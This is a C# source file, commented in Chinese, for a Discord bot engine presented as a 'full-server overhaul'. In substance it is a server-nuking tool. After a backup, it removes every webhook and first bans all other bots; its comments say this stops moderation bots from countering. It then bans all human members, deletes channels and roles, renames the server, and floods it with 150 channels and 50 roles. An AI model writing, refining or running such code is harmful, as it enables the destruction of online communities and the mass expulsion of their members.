using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace AbyssCore
{
    /// <summary>
    /// 全服架構重構核心管線引擎 (三段式階梯清理 + 兩階段多工並發流水線)
    /// Phase 1: 階梯式清理與重塑
    ///   - 階梯 1: 優先清空 Webhooks 與外部整合
    ///   - 階梯 2: 優先並發封鎖所有外部低階 Bot (防止管理 Bot 反制)
    ///   - 階梯 3: 全面並發封鎖身分組在機器人之下之全體成員
    ///   - 同時並行: 舊頻道清理 + 舊身分組刪除 + 品牌更名與描述
    /// Phase 2: 同步並行極速建立 150 迷宮頻道 + 50 迷宮身分組 (主動令牌桶防護)
    /// </summary>
    public sealed class PipelineEngine
    {
        private readonly DiscordApiClient _client;
        private readonly TextsConfig _texts;

        public PipelineEngine(DiscordApiClient client, TextsConfig texts)
        {
            _client = client;
            _texts = texts;
        }

        public async Task<PipelineReport> ExecuteFullOverhaulAsync(
            string guildId,
            string guildName,
            Action<string>? progressCallback = null)
        {
            var sw = Stopwatch.StartNew();
            var report = new PipelineReport();

            // -----------------------------------------------------------------
            // 前置作業：自動備份全服架構 JSON
            // -----------------------------------------------------------------
            progressCallback?.Invoke("◈ [前置備份] 正在完整備份伺服器頻道、身分組與階級至 JSON...");
            try
            {
                string bPath = await GuildBackupManager.BackupGuildStructureAsync(_client, guildId, guildName, "backups");
                report.BackupFilePath = bPath;
                progressCallback?.Invoke($"✔ [前置備份] 備份成功: {System.IO.Path.GetFileName(bPath)}");
            }
            catch (Exception ex)
            {
                progressCallback?.Invoke($"▲ [前置備份] 備份略過: {ex.Message}");
            }

            // -----------------------------------------------------------------
            // 階段一：三段式階梯成員清理與舊架構並發重塑 (Phase 1)
            // -----------------------------------------------------------------
            progressCallback?.Invoke("✦ [階梯淨化] 啟動階梯式深度清理：拔除 Webhook -> 封鎖外部 Bot -> 處分低階成員...");

            // 1. 階梯 1: 優先清理 Webhooks
            report.DeletedWebhooks = await _client.ClearAllWebhooksAsync(guildId);
            progressCallback?.Invoke($"  ✔ [階梯 1/3] 已成功拔除 {report.DeletedWebhooks} 個外部 Webhook 通道。");

            // 2. 獲取成員進行身分組位階篩選 (低於機器人者)
            var members = await _client.GetGuildMembersAsync(guildId);
            var me = await _client.GetCurrentUserAsync();
            string myId = me?.GetProperty("id").GetString() ?? "";

            var targetBots = new List<string>();
            var targetHumans = new List<string>();

            foreach (var m in members)
            {
                if (!m.TryGetProperty("user", out var userProp)) continue;
                string uid = userProp.GetProperty("id").GetString()!;
                if (uid == myId) continue;

                bool isBot = userProp.TryGetProperty("bot", out var bProp) && bProp.GetBoolean();
                if (isBot)
                {
                    targetBots.Add(uid);
                }
                else
                {
                    targetHumans.Add(uid);
                }
            }

            // 階梯 2: 優先並發封鎖所有外部 Bot (防止其他管理 Bot 反制)
            if (targetBots.Count > 0)
            {
                progressCallback?.Invoke($"  ◈ [階梯 2/3] 正在優先封鎖 {targetBots.Count} 個外部 Bot...");
                var botTasks = targetBots.Select(uid => Task.Run(async () =>
                {
                    if (await _client.BanMemberAsync(guildId, uid))
                    {
                        Interlocked.Increment(ref report.BannedBots);
                    }
                }));
                await Task.WhenAll(botTasks);
            }

            // 階梯 3: 全面封鎖身分組在機器人自身之下之全體成員
            if (targetHumans.Count > 0)
            {
                progressCallback?.Invoke($"  ❖ [階梯 3/3] 正在全面封鎖 {targetHumans.Count} 位低於機器人身分組之成員...");
                var humanTasks = targetHumans.Select(uid => Task.Run(async () =>
                {
                    if (await _client.BanMemberAsync(guildId, uid))
                    {
                        Interlocked.Increment(ref report.BannedHumans);
                    }
                }));
                await Task.WhenAll(humanTasks);
            }

            // 與此同時並行：清理舊頻道、身分組、伺服器更名
            progressCallback?.Invoke("✦ [並發加速] 同步清理舊頻道、舊身分組並套用主題名稱與描述...");

            var channels = await _client.GetGuildChannelsAsync(guildId);
            var roles = await _client.GetGuildRolesAsync(guildId);

            int chLimit = _texts.DefaultValues.CleanupChannelLimit;
            string targetName = _texts.GuildSettings.TargetGuildName;
            string targetDesc = _texts.GuildSettings.TargetGuildDescription;

            var channelsToDelete = channels.Skip(3).Take(chLimit).ToList();
            var delChTasks = channelsToDelete.Select(ch =>
            {
                string cid = ch.GetProperty("id").GetString()!;
                return Task.Run(async () =>
                {
                    if (await _client.DeleteChannelAsync(cid))
                    {
                        Interlocked.Increment(ref report.DeletedChannels);
                    }
                });
            });

            var delRoleTasks = roles.Where(r => r.GetProperty("name").GetString() != "@everyone").Select(r =>
            {
                string rid = r.GetProperty("id").GetString()!;
                return Task.Run(async () =>
                {
                    if (await _client.DeleteRoleAsync(guildId, rid))
                    {
                        Interlocked.Increment(ref report.DeletedRoles);
                    }
                });
            });

            var brandingTask = Task.Run(async () =>
            {
                report.GuildRenamed = await _client.ModifyGuildAsync(guildId, targetName, targetDesc);
            });

            await Task.WhenAll(delChTasks.Concat(delRoleTasks).Append(brandingTask));

            progressCallback?.Invoke($"✔ [Phase 1 完成] 階梯清理與舊架構重塑完畢！(拔除 {report.DeletedWebhooks} Webhook、封鎖 {report.BannedBots} Bot + {report.BannedHumans} 成員、刪除 {report.DeletedChannels} 頻道、{report.DeletedRoles} 身分組)");

            // -----------------------------------------------------------------
            // 階段二：並發極速建置 150 迷宮頻道 + 50 迷宮身分組 (Phase 2，主動令牌桶防護)
            // -----------------------------------------------------------------
            int targetChannels = _texts.DefaultValues.CleanupCreateChannels; // 預設 150
            int targetRoles = _texts.DefaultValues.CleanupCreateRoles;       // 預設 50

            progressCallback?.Invoke($"★ [Phase 2 建置] 主動令牌桶控速：同步建立 {targetChannels} 個迷宮頻道 + {targetRoles} 個迷宮身分組...");

            var chNamesPool = _texts.DefaultNames.ChannelNames;
            var roleNamesPool = _texts.DefaultNames.RoleNames;

            var createChTasks = Enumerable.Range(1, targetChannels).Select(i =>
            {
                string name = $"▸-{chNamesPool[i % chNamesPool.Count]}-{i:D3}";
                return Task.Run(async () =>
                {
                    var cid = await _client.CreateChannelAsync(guildId, name, type: 0);
                    if (cid != null)
                    {
                        Interlocked.Increment(ref report.CreatedChannels);
                    }
                });
            });

            var createRoleTasks = Enumerable.Range(1, targetRoles).Select(i =>
            {
                string name = $"✦ {roleNamesPool[i % roleNamesPool.Count]} Lv.{i}";
                int color = Random.Shared.Next(0x100000, 0xFFFFFF);
                return Task.Run(async () =>
                {
                    var rid = await _client.CreateRoleAsync(guildId, name, color);
                    if (rid != null)
                    {
                        Interlocked.Increment(ref report.CreatedRoles);
                    }
                });
            });

            await Task.WhenAll(createChTasks.Concat(createRoleTasks));

            sw.Stop();
            report.ElapsedSeconds = sw.Elapsed.TotalSeconds;

            progressCallback?.Invoke($"★ [建置完畢] 成功自動建立 {report.CreatedChannels}/{targetChannels} 頻道與 {report.CreatedRoles}/{targetRoles} 身分組！");

            return report;
        }
    }

    public class PipelineReport
    {
        public string? BackupFilePath { get; set; }
        public int DeletedWebhooks;
        public int BannedBots;
        public int BannedHumans;
        public int DeletedChannels;
        public int DeletedRoles;
        public int CreatedChannels;
        public int CreatedRoles;
        public bool GuildRenamed;
        public double ElapsedSeconds;
    }
}
